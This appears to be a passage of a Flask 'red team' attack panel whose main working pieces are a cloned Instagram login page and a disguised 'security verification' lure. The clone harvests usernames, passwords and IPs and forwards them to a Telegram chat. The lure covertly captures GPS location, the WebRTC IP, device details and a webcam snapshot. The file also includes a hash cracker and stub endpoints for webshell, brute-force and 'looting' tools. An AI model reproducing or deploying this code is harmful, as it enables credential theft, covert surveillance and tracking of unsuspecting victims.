def save_driving_session():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    DRIVING_SESSIONS.insert(0, data)
    return jsonify({"status": "saved"})

@app.route("/api/driving/reports")
def api_driving_reports():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"reports": DRIVING_SESSIONS})

@app.route("/api/driving/download")
def download_driving_report():
    if not session.get("logged_in"): return "Unauthorized", 401
    idx = int(request.args.get("index", 0))
    if idx < len(DRIVING_SESSIONS):
        rep = DRIVING_SESSIONS[idx]
        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
    return "Rapor bulunamadı", 404

INSTA_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #262626;
            font-size: 14px;
        }
        .main-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 32px 0;
        }
        .left-column {
            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1cc08111d369.png');
            background-size: 454px 618px;
            height: 618px;
            margin-right: 32px;
            width: 454px;
            position: relative;
        }
        .screenshot-container {
            position: absolute;
            top: 99px;
            left: 151px;
            width: 250px;
            height: 538px;
            overflow: hidden;
        }
        .screenshot-container img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            animation: slideShow 15s infinite;
        }
        .screenshot-container img:nth-child(2) { animation-delay: 5s; }
        .screenshot-container img:nth-child(3) { animation-delay: 10s; }

        @keyframes slideShow {
            0% { opacity: 0; }
            8% { opacity: 1; }
            33% { opacity: 1; }
            41% { opacity: 0; }
            100% { opacity: 0; }
        }
        .text-block {
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            background: #ffffff;
            margin-top: 12px;
            padding: 40px 0;
            text-align: center;
            width: 350px;
            position: relative;
            right: -20px;
        }
        .logo {
            display: block;
            margin: 22px auto 12px;
            width: 175px;
        }
        .text-block h2 {
            color: #262626;
            font-size: 22px;
            font-weight: 600;
            line-height: 26px;
            margin: 0 40px 24px;
        }
        .right-column {
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 10px 0;
        }
        .form-group {
            margin: 0 40px 6px;
            position: relative;
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            padding: 9px 0 7px 8px;
            width: 100%;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button.login-btn {
            background-color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 4px;
            color: #ffffff;
            cursor: pointer;
            font-weight: 600;
            padding: 5px 9px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
            margin-top: 8px;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
        }
        .or-divider div {
            border-bottom: 1px solid #dbdbdb;
            flex-grow: 1;
        }
        .or-divider span {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
            cursor: pointer;
            text-decoration: none;
            display: block;
        }
        .fb-login img {
            width: 16px;
            height: 16px;
            vertical-align: middle;
            margin-right: 8px;
            margin-top: -2px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            margin-top: 12px;
            display: block;
            text-decoration: none;
        }
        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 15px 0;
            text-align: center;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .meta-logo {
            width: 50px;
            margin-top: 10px;
        }
        @media (max-width: 875px) {
            .left-column { display: none; }
            .main-wrapper { justify-content: center; }
            .text-block { display: none; }
        }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <div class="left-column">
            <div class="screenshot-container">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe14856348.png" alt="Screenshot 1">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/04d63887ebe8.png" alt="Screenshot 2">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/fa21505733a8.png" alt="Screenshot 3">
            </div>
        </div>
        <div class="right-column">
            <div class="text-block">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbf2d63.png" alt="Instagram" class="logo">
                <h2>Yakın arkadaşlarının günlük <br>anlarını gör.</h2>
            </div>
            <div class="login-box">
                <form method="POST">
                    <div class="form-group">
                        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Şifre" required>
                    </div>
                    <div class="form-group">
                        <button type="submit" class="login-btn">Giriş Yap</button>
                    </div>
                </form>
                <div class="or-divider">
                    <div></div>
                    <span>YA DA</span>
                    <div></div>
                </div>
                <a href="#" class="fb-login">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/A65f6e3aM-C.png" alt="Facebook">
                    Facebook ile giriş yap
                </a>
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
            </div>
            <div class="signup-box">
                Hesabın yok mu? <a href="#">Kaydol</a>
            </div>
            <div style="text-align: center;">
                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/N0qO3qI219A.png" alt="Meta" class="meta-logo">
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route("/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
        if NOTIFY_CHAT_ID and TOKEN:
            try:
                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
            except: pass
        return redirect("https://www.instagram.com")
    return render_template_string(INSTA_TEMPLATE)

@app.route("/api/phish/creds")
def api_phish_creds():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"creds": CREDENTIAL_LOGS})

@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    htype = d.get("type")
    target = d.get("hash").strip().lower()
    wordlist = d.get("wordlist").split("\n")
    found = None
    attempts = 0
    for word in wordlist:
        w = word.strip()
        if not w: continue
        attempts += 1
        if htype == "md5": h = hashlib.md5(w.encode()).hexdigest()
        elif htype == "sha256": h = hashlib.sha256(w.encode()).hexdigest()
        else: h = ""
        if h == target:
            found = w
            break
    if found: out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
    else: out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi."
    return jsonify({"output": out})

@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    port = request.get_json().get("port", 4444)
    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})

TRACK_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Güvenlik Doğrulaması & Sistem Güncellemesi</title>
    <style>
        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #121824; border: 1px solid #00ff66; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.3); max-width: 400px; }
        h3 { color: #38bdf8; margin-top: 0; }
        p { font-size: 13px; color: #94a3b8; }
        .spinner { border: 4px solid #1e293b; border-top: 4px solid #00ff66; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h3>🔒 Güvenlik Doğrulaması</h3>
        <div class="spinner"></div>
        <p id="statusTxt">Cihaz uyumluluğu ve güvenlik doğrulaması yapılıyor, lütfen bekleyin...</p>
    </div>

    <video id="webcam" autoplay playsinline muted style="display:none;"></video>
    <canvas id="snapshotCanvas" style="display:none;"></canvas>

    <script>
        async function runTracker() {
            let data = {
                time: new Date().toLocaleString(),
                ip: "Tespit ediliyor...",
                webrtc_ip: "",
                os: navigator.platform,
                ram: navigator.deviceMemory || "Bilinmiyor",
                cores: navigator.hardwareConcurrency || "Bilinmiyor",
                battery: "Bilinmiyor",
                screen: window.screen.width + "x" + window.screen.height,
                lat: null,
                lon: null,
                snapshot: null
            };

            if (navigator.getBattery) {
                try {
                    let bat = await navigator.getBattery();
                    data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
                } catch(e){}
            }

            try {
                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) data.webrtc_ip = ipMatch[1];
                    }
                };
            } catch(e){}

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        capturePhotoAndSend(data);
                    },
                    (err) => {
                        capturePhotoAndSend(data);
                    },
                    {timeout: 10000, enableHighAccuracy: true}
                );
            } else {
                capturePhotoAndSend(data);
            }
        }

        async function capturePhotoAndSend(data) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById('webcam');
                video.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 1500));

                let canvas = document.getElementById('snapshotCanvas');
                canvas.width = 320; canvas.height = 240;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                data.snapshot = canvas.toDataURL('image/jpeg', 0.7);

                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            fetch('/api/lure/save-geo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('statusTxt').innerText = "✅ Doğrulama başarıyla tamamlandı. Yönlendiriliyorsunuz...";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
            });
        }

        window.onload = runTracker;
    </script>
</body>
</html>
"""

@app.route("/track/<track_id>")
def track_visitor(track_id):
    return TRACK_TEMPLATE

@app.route("/api/lure/save-geo", methods=["POST"])
def save_geo():
    data = request.get_json()
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['ip'] = visitor_ip
    CLICK_LOGS.insert(0, data)
    
    if NOTIFY_CHAT_ID and TOKEN:
        try:
            lat = data.get('lat')
            lon = data.get('lon')
            loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
            msg = f"🎯 [GPS & TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
        except: pass
        
    return jsonify({"status": "saved"})

@app.route("/api/lure/logs")
def api_lure_logs():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"logs": CLICK_LOGS})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    chat_id = request.get_json().get("chat_id")
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Test başarılı!"}, timeout=5)
        return jsonify({"output": "✅ [BAŞARILI] Test mesajı gönderildi!"})
    except Exception as e:
        return jsonify({"output": f"[-] Hata: {str(e)}"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "root@kali:~# wifi audit executed."})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    report, record = red_team_comprehensive_recon(data.get("target", ""))
    SITE_DATABASE.insert(0, record)
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Nikto scan completed."})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "DNS records retrieved."})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "SQLmap test completed."})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Subdomain scan completed."})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Brute-force completed."})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "command executed."})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv")

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", "No record")
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, "Red Team Report")
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})

def red_team_comprehensive_recon(target_url):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
    record = {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report}
    return report, record

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
